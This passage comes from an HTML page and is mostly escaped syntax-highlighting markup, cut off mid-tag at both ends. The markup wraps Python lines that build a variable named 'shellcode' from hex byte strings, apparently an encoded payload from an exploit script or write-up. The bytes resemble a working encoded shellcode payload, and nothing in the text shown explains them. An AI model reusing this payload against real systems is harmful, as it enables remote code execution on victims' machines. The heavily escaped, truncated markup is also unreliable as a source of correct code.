z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xba&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x13&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa8&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x95&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x10&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdd&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x74&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x24&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf4&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x58&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x29&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x52&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x83&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x04&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x31&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x50&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0e&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x03&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x43&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x77&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x06&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9f&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xba&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xae&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xcf&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x81&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9d&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x35&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xfa&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x02&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdd&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x75&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x14&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x13&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x42&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x72&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8d&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x87&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf7&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x24&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd8&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x59&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x40&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xca&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xda&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x61&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x07&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xea&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdd&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x40&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x96&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x60&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x84&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x42&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x19&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbc&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xca&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x01&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x85&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xba&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x19&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x75&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x14&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x50&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x76&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbb&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x53&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x85&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x94&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x76&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xec&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdd&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd7&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x46&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xaf&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x45&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x93&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x77&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x70&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x67&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd8&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x86&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x20&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbd&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character 